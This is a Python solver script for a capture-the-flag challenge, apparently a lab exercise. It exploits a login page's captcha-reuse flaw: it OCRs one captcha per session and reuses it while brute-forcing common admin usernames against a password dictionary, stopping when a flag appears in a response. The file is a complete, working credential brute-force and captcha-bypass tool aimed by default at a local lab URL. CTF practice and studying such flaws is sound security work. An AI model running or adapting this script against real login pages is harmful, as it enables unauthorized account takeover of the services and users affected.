#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import atexit
atexit.register(lambda: print("作者 ZluxYao"))
"""
11-brute-captcha-flaw solver.

The flaw: after a correct captcha is submitted with a wrong password, the same
captcha remains valid in the same session. This script recognizes one captcha
per user/session and reuses it across the password dictionary. If the server
ever reports a captcha error, it refreshes the session and keeps going.
"""

import argparse
import io
import os
import random
import re
import sys
import time
from collections import Counter
from pathlib import Path
from urllib.parse import urljoin

import ddddocr
import requests
from PIL import Image

os.environ["NO_PROXY"] = "*"

DEFAULT_URL = os.environ.get("GKD_URL") or ("http://127.0.0.1:33240/")
DEFAULT_USERS = [
    "admin",
    "administrator",
    "root",
    "test",
    "user",
    "guest",
    "ctf",
    "gkd",
    "gkdctf",
    "togogo",
    "flag",
    "manager",
    "webadmin",
    "sysadmin",
    "superadmin",
]
DEFAULT_PASSWORD_FILE = Path(__file__).with_name("password2.txt")
FLAG_RE = re.compile(r"TOGOGO-flag\{[^}]+\}")
BAD_LOGIN_MARK = "用户名或密码错误"
BAD_CAPTCHA_MARK = "验证码"


def normalize_base_url(url: str) -> str:
    return url.rstrip("/") + "/"


def load_passwords(path: Path) -> list[str]:
    seen: set[str] = set()
    passwords: list[str] = []
    for line in path.read_text(encoding="utf-8", errors="ignore").splitlines():
        pwd = line.strip()
        if not pwd or pwd.startswith("#") or pwd in seen:
            continue
        seen.add(pwd)
        passwords.append(pwd)
    return passwords


def image_variants(img_bytes: bytes) -> list[bytes]:
    img = Image.open(io.BytesIO(img_bytes))

    def encode(image: Image.Image) -> bytes:
        buf = io.BytesIO()
        image.save(buf, format="PNG")
        return buf.getvalue()

    variants = [
        img_bytes,
        encode(img.convert("RGB")),
        encode(img.convert("L").convert("RGB")),
    ]

    gray = img.convert("L")
    for threshold in (150, 160, 170, 180, 190, 200, 210):
        bw = gray.point(lambda x, t=threshold: 0 if x < t else 255, "1").convert("RGB")
        variants.append(encode(bw))

    return variants


def clean_code(raw: str) -> str:
    return "".join(ch for ch in raw if ch.isdigit())


def response_preview(text: str, limit: int = 120) -> str:
    text = re.sub(r"\s+", " ", text or "").strip()
    if len(text) <= limit:
        return text
    return text[:limit] + "..."


class CaptchaBruter:
    def __init__(self, base_url: str, timeout: float, captcha_retries: int, show_debug: bool):
        self.base_url = normalize_base_url(base_url)
        self.timeout = timeout
        self.captcha_retries = captcha_retries
        self.show_debug = show_debug
        self.ocr = ddddocr.DdddOcr(show_ad=False, beta=True)

    def new_session(self) -> requests.Session:
        session = requests.Session()
        session.trust_env = False
        session.headers.update({"User-Agent": "Mozilla/5.0"})
        return session

    def get_captcha_candidates(self, session: requests.Session) -> list[str]:
        resp = session.get(
            urljoin(self.base_url, "yanzhengma.php"),
            params={"nocache": str(random.random())},
            timeout=self.timeout,
        )
        resp.raise_for_status()

        codes: list[str] = []
        for variant in image_variants(resp.content):
            code = clean_code(self.ocr.classification(variant))
            if len(code) == 4:
                codes.append(code)

        return codes

    def get_captcha(self, session: requests.Session) -> str:
        for _ in range(self.captcha_retries):
            candidates = self.get_captcha_candidates(session)
            if candidates:
                counts = Counter(candidates)
                code, votes = counts.most_common(1)[0]
                if self.show_debug:
                    print(f"    [captcha] candidates={dict(counts)} -> {code} ({votes})")
                return code
            if self.show_debug:
                print("    [captcha] OCR produced no 4-digit candidate, retrying")
            time.sleep(0.1)
        raise RuntimeError("captcha OCR failed too many times")

    def login_once(self, session: requests.Session, username: str, password: str, code: str) -> str:
        resp = session.post(
            urljoin(self.base_url, "login.php"),
            data={"name": username, "pwd": password, "yzm": code, "login": "登录"},
            timeout=self.timeout,
            allow_redirects=True,
        )
        return resp.text

    def crack_user(
        self,
        username: str,
        passwords: list[str],
        progress_start: int,
        progress_total: int,
        quiet: bool,
    ) -> tuple[str, str | None] | None:
        session = self.new_session()
        code = self.get_captcha(session)
        print(f"[*] user={username}, reusable captcha={code}")

        for offset, password in enumerate(passwords, start=1):
            current = progress_start + offset - 1
            if not quiet:
                print(f"[*] {current}/{progress_total}: {username}:{password}")
            body = self.login_once(session, username, password, code)

            flag = FLAG_RE.search(body)
            if flag:
                print(f"    [+] captcha={code} accepted")
                return password, flag.group(0)

            if BAD_LOGIN_MARK in body:
                if self.show_debug:
                    print(f"    [-] failed: {response_preview(body)}")
                continue

            if BAD_CAPTCHA_MARK in body:
                print(f"    [~] captcha expired or OCR was wrong, refreshing session")
                session = self.new_session()
                code = self.get_captcha(session)
                print(f"    [~] new reusable captcha={code}")
                body = self.login_once(session, username, password, code)

                flag = FLAG_RE.search(body)
                if flag:
                    print(f"    [+] captcha={code} accepted")
                    return password, flag.group(0)
                if BAD_LOGIN_MARK in body:
                    continue
                if BAD_CAPTCHA_MARK in body:
                    print(f"    [!] refreshed captcha still rejected for {username}:{password}")
                    continue

            # Unknown response might be a successful body without a flag, so
            # return it to the caller instead of silently skipping it.
            print(f"    [!] unexpected response: {response_preview(body)}")
            return password, None

        return None


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Solve 11-brute-captcha-flaw")
    parser.add_argument("--url", default=DEFAULT_URL, help=f"target base URL, default: {DEFAULT_URL}")
    parser.add_argument("--users", default=",".join(DEFAULT_USERS), help="comma-separated usernames")
    parser.add_argument("--password-file", default=str(DEFAULT_PASSWORD_FILE), help="password dictionary")
    parser.add_argument("--timeout", type=float, default=8.0, help="HTTP timeout seconds")
    parser.add_argument("--captcha-retries", type=int, default=10, help="OCR retries before one login attempt")
    parser.add_argument("--debug", action="store_true", help="print OCR candidates and failed response previews")
    parser.add_argument("--quiet", action="store_true", help="print less progress while brute forcing")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    users = [u.strip() for u in args.users.split(",") if u.strip()]
    password_file = Path(args.password_file).expanduser()

    try:
        passwords = load_passwords(password_file)
    except Exception as exc:
        print(f"[-] Failed to load passwords: {exc}", file=sys.stderr)
        return 2

    print(f"[*] target: {normalize_base_url(args.url)}")
    print(f"[*] users: {users}")
    print(f"[*] passwords: {len(passwords)} loaded from {password_file}")

    bruter = CaptchaBruter(args.url, args.timeout, args.captcha_retries, args.debug)
    total = len(users) * len(passwords)

    try:
        for user_index, username in enumerate(users):
            result = bruter.crack_user(
                username,
                passwords,
                progress_start=(user_index * len(passwords)) + 1,
                progress_total=total,
                quiet=args.quiet,
            )
            if result is None:
                continue

            password, flag = result
            print("\n[+] Found valid credential")
            print(f"[+] username = {username}")
            print(f"[+] password = {password}")
            if flag:
                print(f"[+] flag     = {flag}")
            else:
                print("[!] Login looked successful, but no TOGOGO flag was found in the response.")
            return 0
    except KeyboardInterrupt:
        print("\n[-] interrupted")
        return 130
    except requests.RequestException as exc:
        print(f"\n[-] request failed: {exc}", file=sys.stderr)
        return 1

    print("[-] not found")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
